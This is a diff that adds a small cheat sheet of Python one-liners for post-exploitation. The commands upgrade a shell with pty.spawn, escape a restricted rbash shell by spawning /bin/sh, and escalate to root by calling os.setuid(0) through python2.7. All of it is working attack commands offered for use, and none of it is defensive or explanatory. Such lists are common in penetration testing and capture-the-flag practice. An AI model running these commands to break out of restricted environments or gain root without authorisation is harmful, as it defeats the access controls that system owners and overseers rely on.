@@ -1,0 +1,16 @@
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+**********************************************
+
+ESCAPING RBASH
+
+python3 -c 'import os; os.system("/bin/sh");'
+
+**********************************************
+
+PRIV ESC PYTHON 2.7
+
+/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
